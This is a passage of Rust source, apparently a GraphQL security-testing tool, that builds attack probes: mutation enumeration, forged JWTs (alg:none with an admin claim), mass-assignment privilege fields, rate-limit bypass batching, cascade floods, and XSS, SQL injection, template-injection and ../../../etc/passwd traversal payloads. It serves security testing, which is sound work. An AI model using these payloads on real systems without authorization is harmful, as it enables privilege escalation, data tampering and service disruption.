use std::collections::{HashMap, HashSet};

/// Maximum mutation names to enumerate via suggestion brute-force.
const MAX_MUTATION_PROBES: usize = 128;

/// Maximum number of extra fields to inject per mass-assignment test.
const MAX_MASS_ASSIGNMENT_FIELDS: usize = 64;

/// Maximum replay count for idempotency testing.
const MAX_IDEMPOTENCY_REPLAYS: usize = 32;

/// Maximum nesting depth for cascading mutation payloads.
const MAX_CASCADE_DEPTH: usize = 16;

/// Common mutation names for brute-force enumeration when introspection is disabled.
pub const COMMON_MUTATIONS: &[&str] = &[
    "createUser",
    "updateUser",
    "deleteUser",
    "login",
    "logout",
    "register",
    "signup",
    "resetPassword",
    "changePassword",
    "forgotPassword",
    "verifyEmail",
    "updateProfile",
    "deleteAccount",
    "createPost",
    "updatePost",
    "deletePost",
    "createComment",
    "updateComment",
    "deleteComment",
    "createOrder",
    "updateOrder",
    "cancelOrder",
    "createPayment",
    "refundPayment",
    "sendMessage",
    "deleteMessage",
    "updateSettings",
    "createRole",
    "updateRole",
    "deleteRole",
    "assignRole",
    "revokeRole",
    "createTeam",
    "updateTeam",
    "deleteTeam",
    "inviteMember",
    "removeMember",
    "uploadFile",
    "deleteFile",
    "createApiKey",
    "revokeApiKey",
    "enableTwoFactor",
    "disableTwoFactor",
    "createWebhook",
    "deleteWebhook",
    "transferOwnership",
    "exportData",
    "importData",
    "bulkDelete",
    "bulkUpdate",
];

/// Misspelled mutation names to trigger "Did you mean" suggestions.
const MUTATION_SUGGESTION_PROBES: &[&str] = &[
    "cretUser",
    "creatUsr",
    "updatUser",
    "deletUsr",
    "loign",
    "lgout",
    "registr",
    "signp",
    "resetPasswrd",
    "changPasswrd",
    "updatProfile",
    "deletAccount",
    "creatPost",
    "updatPost",
    "deletPost",
    "creatOrder",
    "cancleOrder",
    "creatPaymnt",
    "refndPayment",
    "sendMsg",
    "deletMsg",
    "updatSettings",
    "creatRole",
    "assgnRole",
    "revokeRle",
    "creatTeam",
    "invitMember",
    "removMember",
    "uplodFile",
    "creatApiKey",
    "revokApiKey",
    "enablTwoFactor",
    "transferOwnrship",
    "exprtData",
    "bulkDelet",
];

/// Fields commonly used for mass-assignment attacks against mutations.
const MASS_ASSIGNMENT_FIELDS: &[&str] = &[
    "role",
    "isAdmin",
    "is_admin",
    "admin",
    "permissions",
    "verified",
    "isVerified",
    "is_verified",
    "emailVerified",
    "email_verified",
    "active",
    "isActive",
    "is_active",
    "banned",
    "isBanned",
    "suspended",
    "balance",
    "credits",
    "plan",
    "tier",
    "subscription",
    "subscriptionTier",
    "apiLimit",
    "rateLimit",
    "rate_limit",
    "quota",
    "organizationId",
    "tenantId",
    "tenant_id",
    "ownerId",
    "owner_id",
    "createdAt",
    "updatedAt",
    "deletedAt",
    "internalId",
    "internal_id",
    "secretKey",
    "apiKey",
    "passwordHash",
    "password_hash",
    "salt",
    "twoFactorSecret",
    "two_factor_secret",
    "ssoProvider",
    "featureFlags",
    "feature_flags",
    "metadata",
    "rawData",
    "debug",
    "test",
    "__typename",
    "_id",
    "id",
];

/// Input validation bypass payloads for mutation argument fuzzing.
const INPUT_VALIDATION_PAYLOADS: &[(&str, InputBypassCategory)] = &[
    ("", InputBypassCategory::EmptyString),
    (" ", InputBypassCategory::WhitespaceOnly),
    ("\t\n\r", InputBypassCategory::WhitespaceOnly),
    ("null", InputBypassCategory::NullLiteral),
    ("undefined", InputBypassCategory::NullLiteral),
    ("true", InputBypassCategory::TypeConfusion),
    ("0", InputBypassCategory::TypeConfusion),
    ("-1", InputBypassCategory::TypeConfusion),
    ("99999999999999999999", InputBypassCategory::NumericOverflow),
    (
        "-99999999999999999999",
        InputBypassCategory::NumericOverflow,
    ),
    (
        "1.7976931348623157e+308",
        InputBypassCategory::NumericOverflow,
    ),
    ("NaN", InputBypassCategory::NumericOverflow),
    ("Infinity", InputBypassCategory::NumericOverflow),
    (
        "<script>alert(1)</script>",
        InputBypassCategory::SpecialChars,
    ),
    ("' OR 1=1 --", InputBypassCategory::SpecialChars),
    ("\" OR 1=1 --", InputBypassCategory::SpecialChars),
    ("${7*7}", InputBypassCategory::SpecialChars),
    ("{{7*7}}", InputBypassCategory::SpecialChars),
    ("../../../etc/passwd", InputBypassCategory::SpecialChars),
    ("\0", InputBypassCategory::NullByte),
    ("\0admin", InputBypassCategory::NullByte),
    ("admin\0ignored", InputBypassCategory::NullByte),
];

// ─── Pattern 1: Mutation Enumeration ─────────────────────────────────────────

/// Result of mutation enumeration via brute-force and suggestion extraction.
#[derive(Debug, Clone)]
pub struct MutationEnumerationResult {
    /// Mutations discovered via direct probing.
    pub discovered_mutations: Vec<String>,
    /// Mutations discovered via "Did you mean" suggestion extraction.
    pub suggested_mutations: HashMap<String, Vec<String>>,
    /// Total unique mutation names found.
    pub unique_count: usize,
    /// Probe queries generated for manual execution.
    pub probes: Vec<MutationProbe>,
}

/// A single mutation probe query.
#[derive(Debug, Clone)]
pub struct MutationProbe {
    /// The GraphQL query string.
    pub query: String,
    /// The mutation name being probed.
    pub target_name: String,
    /// Whether this probe is a typo designed to trigger suggestions.
    pub is_suggestion_probe: bool,
}

/// Build mutation probes for direct enumeration and suggestion extraction.
///
/// Generates minimal `mutation { name }` queries for each candidate name,
/// plus misspelled variants that trigger "Did you mean" error responses
/// on servers with suggestion engines.
pub fn build_mutation_probes(additional_names: &[&str]) -> Vec<MutationProbe> {
    let mut probes = Vec::new();

    let all_names: Vec<&str> = COMMON_MUTATIONS
        .iter()
        .copied()
        .chain(additional_names.iter().copied())
        .take(MAX_MUTATION_PROBES)
        .collect();

    for name in &all_names {
        probes.push(MutationProbe {
            query: format!("mutation {{ {name} }}"),
            target_name: name.to_string(),
            is_suggestion_probe: false,
        });
    }

    for probe in MUTATION_SUGGESTION_PROBES {
        probes.push(MutationProbe {
            query: format!("mutation {{ {probe} }}"),
            target_name: probe.to_string(),
            is_suggestion_probe: true,
        });
    }

    probes
}

/// Process enumeration responses and extract discovered mutation names.
///
/// `probe_responses` maps probe name to server response text. Responses
/// without errors are treated as valid mutations; error responses are
/// parsed for "Did you mean" suggestions.
pub fn process_mutation_enumeration(probe_responses: &[(&str, &str)]) -> MutationEnumerationResult {
    let mut discovered = Vec::new();
    let mut suggestions: HashMap<String, Vec<String>> = HashMap::new();
    let mut all_names = HashSet::new();
    let mut probes = Vec::new();

    for (probe_name, response) in probe_responses {
        let lower = response.to_lowercase();
        if !lower.contains("error") && !lower.contains("cannot query") {
            discovered.push(probe_name.to_string());
            all_names.insert(probe_name.to_string());
        }

        let suggested = extract_mutation_suggestions(response);
        if !suggested.is_empty() {
            for s in &suggested {
                all_names.insert(s.clone());
            }
            suggestions.insert(probe_name.to_string(), suggested);
        }
    }

    for name in &discovered {
        probes.push(MutationProbe {
            query: format!("mutation {{ {name} }}"),
            target_name: name.clone(),
            is_suggestion_probe: false,
        });
    }

    MutationEnumerationResult {
        discovered_mutations: discovered,
        suggested_mutations: suggestions,
        unique_count: all_names.len(),
        probes,
    }
}

/// Extract mutation names from "Did you mean" style error messages.
fn extract_mutation_suggestions(error_text: &str) -> Vec<String> {
    let mut fields = HashSet::new();
    let lower = error_text.to_lowercase();

    let anchors = [
        "did you mean",
        "did you mean:",
        "suggestions:",
        "not found in type",
    ];

    for anchor in &anchors {
        if let Some(pos) = lower.find(anchor) {
            let tail = &error_text[pos..];
            extract_quoted_identifiers(tail, &mut fields);
        }
    }

    let mut result: Vec<String> = fields.into_iter().collect();
    result.sort();
    result
}

/// Extract double-quoted and single-quoted identifiers from text.
fn extract_quoted_identifiers(text: &str, fields: &mut HashSet<String>) {
    for quote in ['"', '\''] {
        let mut remaining = text;
        while let Some(open) = remaining.find(quote) {
            let after = &remaining[open + 1..];
            let Some(close) = after.find(quote) else {
                break;
            };
            let candidate = &after[..close];
            if is_mutation_identifier(candidate) {
                fields.insert(candidate.to_string());
            }
            remaining = &after[close + 1..];
        }
    }
}

fn is_mutation_identifier(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= 128
        && name.starts_with(|c: char| c.is_ascii_alphabetic() || c == '_')
        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
}

// ─── Pattern 2: Unauthorized Mutation Access ─────────────────────────────────

/// Token variant for mutation authorization bypass testing.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum MutationAuthToken {
    /// No authorization header.
    NoAuth,
    /// Empty Bearer header value.
    EmptyBearer,
    /// Expired JWT with valid structure.
    ExpiredJwt(String),
    /// JWT with wrong role claim.
    WrongRole(String),
    /// JWT with alg:none bypass.
    AlgNone(String),
    /// Malformed token string.
    Malformed(String),
    /// JWT with tampered user/tenant claims.
    TamperedClaims(String),
}

/// A generated unauthorized mutation test case.
#[derive(Debug, Clone)]
pub struct UnauthorizedMutationTest {
    /// The mutation query to send.
    pub query: String,
    /// The auth token variant.
    pub token: MutationAuthToken,
    /// Description of the bypass attempt.
    pub description: String,
    /// Target mutation name.
    pub mutation_name: String,
}

/// Generate unauthorized access test cases for a mutation.
///
/// Produces one test per token variant: no auth, empty bearer, expired JWT,
/// wrong role, alg:none bypass, malformed token, and tampered claims.
pub fn generate_unauthorized_mutation_tests(
    mutation_name: &str,
    args: &str,
) -> Vec<UnauthorizedMutationTest> {
    let query = if args.is_empty() {
        format!("mutation {{ {mutation_name} {{ id __typename }} }}")
    } else {
        format!("mutation {{ {mutation_name}({args}) {{ id __typename }} }}")
    };

    let tokens = [
        (
            MutationAuthToken::NoAuth,
            format!("Execute '{mutation_name}' with no authentication"),
        ),
        (
            MutationAuthToken::EmptyBearer,
            format!("Execute '{mutation_name}' with empty Bearer header"),
        ),
        (
            MutationAuthToken::ExpiredJwt(
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.\
                 eyJzdWIiOiIxIiwicm9sZSI6InVzZXIiLCJleHAiOjE1MDAwMDAwMDB9.\
                 invalid"
                    .to_string(),
            ),
            format!("Execute '{mutation_name}' with expired JWT"),
        ),
        (
            MutationAuthToken::WrongRole(
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.\
                 eyJzdWIiOiIxIiwicm9sZSI6Imd1ZXN0IiwiZXhwIjo5OTk5OTk5OTk5fQ.\
                 invalid"
                    .to_string(),
            ),
            format!("Execute '{mutation_name}' with guest role JWT"),
        ),
        (
            MutationAuthToken::AlgNone(
                "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.\
                 eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0."
                    .to_string(),
            ),
            format!("Execute '{mutation_name}' with alg:none JWT (admin claim)"),
        ),
        (
            MutationAuthToken::Malformed("not-a-jwt-token".to_string()),
            format!("Execute '{mutation_name}' with malformed token string"),
        ),
        (
            MutationAuthToken::TamperedClaims(
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.\
                 eyJzdWIiOiI5OTkiLCJ0ZW5hbnRJZCI6ImV2aWwiLCJleHAiOjk5OTk5OTk5OTl9.\
                 invalid"
                    .to_string(),
            ),
            format!("Execute '{mutation_name}' with tampered tenant claim"),
        ),
    ];

    tokens
        .into_iter()
        .map(|(token, description)| UnauthorizedMutationTest {
            query: query.clone(),
            token,
            description,
            mutation_name: mutation_name.to_string(),
        })
        .collect()
}

/// Generate unauthorized access tests for multiple mutations.
pub fn generate_unauthorized_mutation_suite(
    mutations: &[(&str, &str)],
) -> Vec<UnauthorizedMutationTest> {
    mutations
        .iter()
        .flat_map(|(name, args)| generate_unauthorized_mutation_tests(name, args))
        .collect()
}

// ─── Pattern 3: Mass Assignment via Mutation ─────────────────────────────────

/// A mass-assignment test payload.
#[derive(Debug, Clone)]
pub struct MassAssignmentPayload {
    /// The mutation query with extra fields injected.
    pub query: String,
    /// Target mutation name.
    pub mutation_name: String,
    /// Extra fields injected beyond the intended input.
    pub injected_fields: Vec<String>,
    /// Category of the injected field (privilege, identity, internal).
    pub category: MassAssignmentCategory,
}

/// Classification of mass-assignment fields by risk.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum MassAssignmentCategory {
    /// Privilege escalation fields (role, isAdmin, permissions).
    PrivilegeEscalation,
    /// Identity confusion fields (tenantId, ownerId).
    IdentityConfusion,
    /// Internal metadata fields (createdAt, internalId).
    InternalMetadata,
    /// Feature bypass fields (featureFlags, quota).
    FeatureBypass,
    /// Debug/test fields (__typename, debug, test).
    DebugAccess,
}

/// Classify a mass-assignment field name into a risk category.
fn classify_mass_assignment_field(field: &str) -> MassAssignmentCategory {
    let lower = field.to_lowercase();
    if lower.contains("admin")
        || lower.contains("role")
        || lower.contains("permission")
        || lower.contains("verified")
        || lower.contains("active")
        || lower.contains("banned")
        || lower.contains("suspended")
    {
        MassAssignmentCategory::PrivilegeEscalation
    } else if lower.contains("tenant") || lower.contains("organization") || lower.contains("owner")
    {
        MassAssignmentCategory::IdentityConfusion
    } else if lower.contains("created")
        || lower.contains("updated")
        || lower.contains("deleted")
        || lower.contains("internal")
        || lower.contains("hash")
        || lower.contains("salt")
        || lower.contains("secret")
        || lower.contains("sso")
    {
        MassAssignmentCategory::InternalMetadata
    } else if lower.contains("feature")
        || lower.contains("flag")
        || lower.contains("quota")
        || lower.contains("limit")
        || lower.contains("plan")
        || lower.contains("tier")
        || lower.contains("subscription")
        || lower.contains("credit")
        || lower.contains("balance")
    {
        MassAssignmentCategory::FeatureBypass
    } else {
        MassAssignmentCategory::DebugAccess
    }
}

/// Generate mass-assignment payloads for a mutation.
///
/// Injects undocumented fields into the mutation's input argument
/// to test whether the server accepts and persists fields that should
/// not be user-controllable (role, isAdmin, tenantId, etc.).
pub fn generate_mass_assignment_payloads(
    mutation_name: &str,
    known_input_fields: &[&str],
) -> Vec<MassAssignmentPayload> {
    let mut payloads = Vec::new();
    let known_set: HashSet<&str> = known_input_fields.iter().copied().collect();

    let injection_fields: Vec<&str> = MASS_ASSIGNMENT_FIELDS
        .iter()
        .filter(|f| !known_set.contains(**f))
        .copied()
        .take(MAX_MASS_ASSIGNMENT_FIELDS)
        .collect();

    let categories: HashMap<MassAssignmentCategory, Vec<&str>> = {
        let mut map: HashMap<MassAssignmentCategory, Vec<&str>> = HashMap::new();
        for field in &injection_fields {
            map.entry(classify_mass_assignment_field(field))
                .or_default()
                .push(field);
        }
        map
    };

    for (category, fields) in &categories {
        let field_args: Vec<String> = fields.iter().map(|f| format!("{f}: true")).collect();
        let known_args: Vec<String> = known_input_fields
            .iter()
            .map(|f| format!("{f}: \"test\""))
            .collect();
        let all_args = known_args
            .iter()
            .chain(field_args.iter())
            .cloned()
            .collect::<Vec<_>>()
            .join(", ");

        let query =
            format!("mutation {{ {mutation_name}(input: {{ {all_args} }}) {{ id __typename }} }}");

        payloads.push(MassAssignmentPayload {
            query,
            mutation_name: mutation_name.to_string(),
            injected_fields: fields.iter().map(|f| f.to_string()).collect(),
            category: *category,
        });
    }

    let all_at_once: Vec<String> = injection_fields
        .iter()
        .map(|f| format!("{f}: true"))
        .collect();
    let known_args: Vec<String> = known_input_fields
        .iter()
        .map(|f| format!("{f}: \"test\""))
        .collect();
    let combined = known_args
        .iter()
        .chain(all_at_once.iter())
        .cloned()
        .collect::<Vec<_>>()
        .join(", ");
    let query =
        format!("mutation {{ {mutation_name}(input: {{ {combined} }}) {{ id __typename }} }}");
    payloads.push(MassAssignmentPayload {
        query,
        mutation_name: mutation_name.to_string(),
        injected_fields: injection_fields.iter().map(|f| f.to_string()).collect(),
        category: MassAssignmentCategory::PrivilegeEscalation,
    });

    payloads
}

// ─── Pattern 4: Mutation Rate Limiting ───────────────────────────────────────

/// A mutation rate-limit test case.
#[derive(Debug, Clone)]
pub struct RateLimitTest {
    /// Mutation queries to send in rapid succession.
    pub queries: Vec<String>,
    /// Expected number of requests before rate limiting kicks in.
    pub burst_count: usize,
    /// Rate-limit technique being tested.
    pub technique: RateLimitTechnique,
    /// Target mutation name.
    pub mutation_name: String,
}

/// Rate-limit bypass technique.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RateLimitTechnique {
    /// Rapid identical requests to detect rate limiting threshold.
    DirectBurst,
    /// Batch multiple mutations in a single request via aliases.
    AliasBatching,
    /// Alternate between mutations to test per-field vs global limits.
    FieldRotation,
    /// Use query aliasing to pack mutations into a single operation.
    QuerySmuggling,
}

/// Generate rate-limit test payloads for a mutation.
///
/// Produces burst sequences, alias-batched requests, field rotation
/// sequences, and query-smuggled payloads to test whether mutations
/// have rate limits and whether those limits can be bypassed.
pub fn generate_rate_limit_tests(
    mutation_name: &str,
    args: &str,
    burst_count: usize,
) -> Vec<RateLimitTest> {
    let effective_burst = burst_count.clamp(2, 256);
    let mut tests = Vec::new();

    let single_query = if args.is_empty() {
        format!("mutation {{ {mutation_name} {{ id }} }}")
    } else {
        format!("mutation {{ {mutation_name}({args}) {{ id }} }}")
    };

    let burst_queries: Vec<String> = (0..effective_burst).map(|_| single_query.clone()).collect();
    tests.push(RateLimitTest {
        queries: burst_queries,
        burst_count: effective_burst,
        technique: RateLimitTechnique::DirectBurst,
        mutation_name: mutation_name.to_string(),
    });

    let alias_parts: Vec<String> = (0..effective_burst)
        .map(|i| {
            if args.is_empty() {
                format!("m{i}: {mutation_name} {{ id }}")
            } else {
                format!("m{i}: {mutation_name}({args}) {{ id }}")
            }
        })
        .collect();
    let batched_query = format!("mutation {{ {} }}", alias_parts.join(" "));
    tests.push(RateLimitTest {
        queries: vec![batched_query],
        burst_count: effective_burst,
        technique: RateLimitTechnique::AliasBatching,
        mutation_name: mutation_name.to_string(),
    });

    let rotation_mutations = [
        "createUser",
        "updateUser",
        "deleteUser",
        "createPost",
        "updatePost",
    ];
    let rotation_queries: Vec<String> = rotation_mutations
        .iter()
        .cycle()
        .take(effective_burst)
        .map(|m| format!("mutation {{ {m} {{ id }} }}"))
        .collect();
    tests.push(RateLimitTest {
        queries: rotation_queries,
        burst_count: effective_burst,
        technique: RateLimitTechnique::FieldRotation,
        mutation_name: mutation_name.to_string(),
    });

    let smuggle_parts: Vec<String> = (0..effective_burst.min(10))
        .map(|i| {
            if args.is_empty() {
                format!("s{i}: {mutation_name} {{ id __typename }}")
            } else {
                format!("s{i}: {mutation_name}({args}) {{ id __typename }}")
            }
        })
        .collect();
    let smuggled = format!("mutation RateBypass {{ {} }}", smuggle_parts.join(" "));
    tests.push(RateLimitTest {
        queries: vec![smuggled],
        burst_count: effective_burst.min(10),
        technique: RateLimitTechnique::QuerySmuggling,
        mutation_name: mutation_name.to_string(),
    });

    tests
}

// ─── Pattern 5: Nested Mutation Abuse ────────────────────────────────────────

/// A nested/cascading mutation payload.
#[derive(Debug, Clone)]
pub struct NestedMutationPayload {
    /// The GraphQL mutation string.
    pub query: String,
    /// Effective nesting depth.
    pub depth: usize,
    /// Mutation names in the cascade chain.
    pub chain: Vec<String>,
    /// Nesting technique.
    pub technique: NestingTechnique,
}

/// Technique for nested mutation generation.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum NestingTechnique {
    /// Nested selection sets that trigger cascading writes.
    DeepSelection,
    /// Fragment-based nesting to hide mutation depth.
    FragmentNesting,
    /// Alias-multiplied mutations at each nesting level.
    AliasMultiplied,
}

/// Generate nested mutation payloads that trigger cascading writes.
///
/// Produces deeply nested mutation selection sets, fragment-hidden nesting,
/// and alias-multiplied cascades to test for unintended write amplification.
pub fn generate_nested_mutation_payloads(
    mutation_names: &[&str],
    max_depth: usize,
) -> Vec<NestedMutationPayload> {
    let effective_depth = max_depth.min(MAX_CASCADE_DEPTH);
    let mut payloads = Vec::new();

    if mutation_names.is_empty() {
        return payloads;
    }

    let mut inner = "id __typename".to_string();
    let mut chain = Vec::new();
    for (level, name) in mutation_names
        .iter()
        .cycle()
        .take(effective_depth)
        .enumerate()
    {
        chain.push(name.to_string());
        if level == 0 {
            inner = format!("{name} {{ {inner} }}");
        } else {
            inner = format!("{name} {{ {inner} }}");
        }
    }
    let query = format!("mutation CascadeProbe {{ {inner} }}");
    payloads.push(NestedMutationPayload {
        query,
        depth: effective_depth,
        chain: chain.clone(),
        technique: NestingTechnique::DeepSelection,
    });

    let mut fragments = Vec::new();
    for (i, name) in mutation_names
        .iter()
        .cycle()
        .take(effective_depth)
        .enumerate()
    {
        let frag_name = format!("MF{i}");
        let body = if i + 1 < effective_depth {
            let next = format!("MF{}", i + 1);
            format!("fragment {frag_name} on Mutation {{ {name} {{ ...{next} }} }}")
        } else {
            format!("fragment {frag_name} on Mutation {{ {name} {{ id }} }}")
        };
        fragments.push(body);
    }
    let frag_query = if effective_depth > 0 {
        format!(
            "mutation FragmentCascade {{ ...MF0 }}\n{}",
            fragments.join("\n")
        )
    } else {
        "mutation FragmentCascade { __typename }".to_string()
    };
    payloads.push(NestedMutationPayload {
        query: frag_query,
        depth: effective_depth,
        chain: chain.clone(),
        technique: NestingTechnique::FragmentNesting,
    });

    let primary = mutation_names[0];
    let mut alias_inner = "id __typename".to_string();
    for level in 0..effective_depth.min(6) {
        let aliases: Vec<String> = (0..3)
            .map(|a| format!("a{level}_{a}: {primary} {{ {alias_inner} }}"))
            .collect();
        alias_inner = aliases.join(" ");
    }
    let alias_query = format!("mutation AliasFlood {{ {alias_inner} }}");
    payloads.push(NestedMutationPayload {
        query: alias_query,
        depth: effective_depth.min(6),
        chain: vec![primary.to_string()],
        technique: NestingTechnique::AliasMultiplied,
    });

    payloads
}

// ─── Pattern 6: Input Validation Bypass ──────────────────────────────────────

/// Classification of input validation bypass payloads.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum InputBypassCategory {
    /// Empty string input.
    EmptyString,
    /// Whitespace-only input.
    WhitespaceOnly,
    /// Null/undefined literal as string.
    NullLiteral,
    /// Type confusion (boolean/number as string).
    TypeConfusion,
    /// Numeric overflow values.
    NumericOverflow,
    /// Special characters (XSS, SQLi, SSTI, path traversal).
    SpecialChars,
    /// Null byte injection.
    NullByte,
    /// Oversized string input.
    OversizedInput,
    /// Unicode edge cases.
    UnicodeEdgeCase,
}

/// A single input validation bypass test.
#[derive(Debug, Clone)]
pub struct InputValidationTest {
    /// The mutation query with the bypass payload.
    pub query: String,
    /// Target mutation name.
    pub mutation_name: String,
    /// Target argument being fuzzed.
    pub target_argument: String,
    /// The injected value.
    pub payload: String,
    /// Bypass category.
    pub category: InputBypassCategory,
}

/// Generate input validation bypass tests for a mutation argument.
///
/// Produces queries with empty strings, null bytes, oversized inputs,
/// special characters, unicode edge cases, and type confusion payloads.
pub fn generate_input_validation_tests(
    mutation_name: &str,
    target_arg: &str,
) -> Vec<InputValidationTest> {
    let mut tests = Vec::new();

    for (payload, category) in INPUT_VALIDATION_PAYLOADS {
        let escaped = payload.replace('\\', "\\\\").replace('"', "\\\"");
        let query = format!(
            "mutation {{ {mutation_name}({target_arg}: \"{escaped}\") {{ id __typename }} }}"
        );
        tests.push(InputValidationTest {
            query,
            mutation_name: mutation_name.to_string(),
            target_argument: target_arg.to_string(),
            payload: payload.to_string(),
            category: *category,
        });
    }

    let oversized = "A".repeat(100_000);
    let query = format!(
        "mutation {{ {mutation_name}({target_arg}: \"{oversized}\") {{ id __typename }} }}"
    );
    tests.push(InputValidationTest {
        query,
        mutation_name: mutation_name.to_string(),
        target_argument: target_arg.to_string(),
        payload: format!("A x 100000 ({} bytes)", oversized.len()),
        category: InputBypassCategory::OversizedInput,
    });

    let unicode_payloads = [
        ("\u{200B}", "zero-width space"),
        ("\u{FEFF}", "BOM character"),
        ("\u{202E}admin", "RTL override + admin"),
        ("\u{0000}", "null codepoint"),
        (
            "a\u{0300}\u{0301}\u{0302}\u{0303}\u{0304}",
            "combining marks flood",
        ),
    ];
    for (payload, _desc) in &unicode_payloads {
        let escaped = payload.replace('\\', "\\\\").replace('"', "\\\"");
        let query = format!(
            "mutation {{ {mutation_name}({target_arg}: \"{escaped}\") {{ id __typename }} }}"
        );
        tests.push(InputValidationTest {
            query,
            mutation_name: mutation_name.to_string(),
            target_argument: target_arg.to_string(),
            payload: payload.to_string(),
            category: InputBypassCategory::UnicodeEdgeCase,
        });
    }

    tests
}

// ─── Pattern 7: Delete Cascade ───────────────────────────────────────────────

/// A delete cascade test payload.
#[derive(Debug, Clone)]
pub struct DeleteCascadeTest {
    /// The delete mutation query.
    pub query: String,
    /// Verification query to check cascade effects.
    pub verification_query: String,
    /// Target type being deleted.
    pub target_type: String,
    /// Related types that may be cascaded.
    pub related_types: Vec<String>,
    /// Cascade technique.
    pub technique: CascadeTechnique,
}

/// Technique for delete cascade testing.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CascadeTechnique {
    /// Delete a parent record and verify child existence.
    ParentDeletion,
    /// Delete via a foreign key relationship.
    ForeignKeyDeletion,
    /// Soft-delete verification (deletedAt vs actual removal).
    SoftDeleteVerification,
    /// Batch delete to test cascade under load.
    BatchDeleteCascade,
}

/// Common parent-child type relationships for cascade testing.
const CASCADE_RELATIONSHIPS: &[(&str, &[&str])] = &[
    ("User", &["Post", "Comment", "Order", "Session", "ApiKey"]),
    ("Post", &["Comment", "Like", "Bookmark"]),
    ("Order", &["OrderItem", "Payment", "Shipment"]),
    ("Team", &["Member", "Project", "Channel"]),
    ("Organization", &["Team", "User", "Subscription"]),
    ("Project", &["Task", "File", "Comment"]),
];

/// Generate delete cascade test payloads.
///
/// Produces delete mutations for parent types with verification queries
/// that check whether child records were unexpectedly removed. Tests
/// parent deletion, foreign key cascades, soft-delete behavior, and
/// batch delete amplification.
pub fn generate_delete_cascade_tests(
    custom_relationships: &[(&str, &[&str])],
) -> Vec<DeleteCascadeTest> {
    let mut tests = Vec::new();

    let relationships: Vec<(&str, &[&str])> = if custom_relationships.is_empty() {
        CASCADE_RELATIONSHIPS.to_vec()
    } else {
        custom_relationships.to_vec()
    };

    for (parent, children) in &relationships {
        let parent_lower = parent.to_lowercase();
        let delete_name = format!("delete{parent}");
        let query =
            format!("mutation {{ {delete_name}(id: \"test-cascade-id\") {{ id __typename }} }}");

        let child_checks: Vec<String> = children
            .iter()
            .enumerate()
            .map(|(i, child)| {
                let child_lower = child.to_lowercase();
                format!(
                    "c{i}: {child_lower}s(where: {{ {parent_lower}Id: \"test-cascade-id\" }}) {{ id }}"
                )
            })
            .collect();
        let verification = format!("{{ {} }}", child_checks.join(" "));

        tests.push(DeleteCascadeTest {
            query: query.clone(),
            verification_query: verification,
            target_type: parent.to_string(),
            related_types: children.iter().map(|c| c.to_string()).collect(),
            technique: CascadeTechnique::ParentDeletion,
        });

        for child in *children {
            let child_lower = child.to_lowercase();
            let fk_query = format!(
                "mutation {{ delete{child}(where: {{ {parent_lower}Id: \"test-cascade-id\" }}) {{ id }} }}"
            );
            let fk_verify = format!(
                "{{ {parent_lower}(id: \"test-cascade-id\") {{ id {child_lower}s {{ id }} }} }}"
            );
            tests.push(DeleteCascadeTest {
                query: fk_query,
                verification_query: fk_verify,
                target_type: child.to_string(),
                related_types: vec![parent.to_string()],
                technique: CascadeTechnique::ForeignKeyDeletion,
            });
        }

        let soft_verify =
            format!("{{ {parent_lower}(id: \"test-cascade-id\") {{ id deletedAt isDeleted }} }}");
        tests.push(DeleteCascadeTest {
            query: query.clone(),
            verification_query: soft_verify,
            target_type: parent.to_string(),
            related_types: children.iter().map(|c| c.to_string()).collect(),
            technique: CascadeTechnique::SoftDeleteVerification,
        });

        let batch_ids: Vec<String> = (0..5).map(|i| format!("\"batch-{i}\"")).collect();
        let batch_query = format!(
            "mutation {{ {delete_name}Batch(ids: [{}]) {{ count }} }}",
            batch_ids.join(", ")
        );
        let batch_verify = format!(
            "{{ {parent_lower}s(where: {{ id_in: [{}] }}) {{ id }} }}",
            batch_ids.join(", ")
        );
        tests.push(DeleteCascadeTest {
            query: batch_query,
            verification_query: batch_verify,
            target_type: parent.to_string(),
            related_types: children.iter().map(|c| c.to_string()).collect(),
            technique: CascadeTechnique::BatchDeleteCascade,
        });
    }

    tests
}

// ─── Pattern 8: Idempotency Testing ──────────────────────────────────────────

/// An idempotency test case.
#[derive(Debug, Clone)]
pub struct IdempotencyTest {
    /// The mutation query to replay.
    pub query: String,
    /// Number of times to replay.
    pub replay_count: usize,
    /// Expected behavior if the mutation is idempotent.
    pub expected_behavior: IdempotencyExpectation,
    /// Target mutation name.
    pub mutation_name: String,
    /// Optional idempotency key header to include.
    pub idempotency_key: Option<String>,
}

/// Expected idempotency behavior.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum IdempotencyExpectation {
    /// Mutation should produce the same result on replay (true idempotent).
    SameResult,
    /// Mutation should reject replay as duplicate.
    RejectDuplicate,
    /// Mutation should create duplicate records (non-idempotent, potential bug).
    DuplicateCreation,
    /// Mutation with idempotency key should be deduplicated.
    KeyBasedDedup,
}

/// Mutations that should typically be idempotent.
const IDEMPOTENT_MUTATIONS: &[&str] = &[
    "updateUser",
    "updateProfile",
    "updateSettings",
    "updatePost",
    "updateOrder",
    "updateRole",
];

/// Mutations that are commonly non-idempotent (create/send actions).
const NON_IDEMPOTENT_MUTATIONS: &[&str] = &[
    "createUser",
    "createPost",
    "createOrder",
    "createPayment",
    "sendMessage",
    "createComment",
    "createApiKey",
    "inviteMember",
];

/// Generate idempotency test cases for a mutation.
///
/// Tests whether replaying a mutation produces duplicates, is rejected,
/// or returns the same result. Also tests idempotency key header support.
pub fn generate_idempotency_tests(
    mutation_name: &str,
    args: &str,
    replay_count: usize,
) -> Vec<IdempotencyTest> {
    let effective_replays = replay_count.clamp(2, MAX_IDEMPOTENCY_REPLAYS);
    let mut tests = Vec::new();

    let query = if args.is_empty() {
        format!("mutation {{ {mutation_name}(input: {{ name: \"idempotency-test\" }}) {{ id __typename }} }}")
    } else {
        format!("mutation {{ {mutation_name}({args}) {{ id __typename }} }}")
    };

